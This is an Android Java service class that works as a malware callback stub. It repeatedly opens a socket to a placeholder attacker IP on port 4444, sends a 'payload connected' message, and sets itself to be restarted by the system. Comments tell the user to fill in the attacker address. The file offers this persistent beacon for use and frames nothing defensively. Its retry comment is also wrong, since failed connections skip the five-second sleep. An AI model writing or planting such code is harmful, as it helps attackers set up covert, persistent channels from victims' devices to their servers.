package com.example.myapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;

public class ConnectionService extends Service {
    private static final String SERVER_IP = "YOUR_ATTACKER_IP";  // Replace with attacker IP
    private static final int SERVER_PORT = 4444;                 // Replace with attacker port

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            while (true) {
                try {
                    Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                    OutputStream out = socket.getOutputStream();
                    PrintWriter writer = new PrintWriter(out, true);
                    writer.println("Payload connected to the attacker machine.");
                    socket.close();
                    Thread.sleep(5000);  // Retry connection every 5 seconds if it fails
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
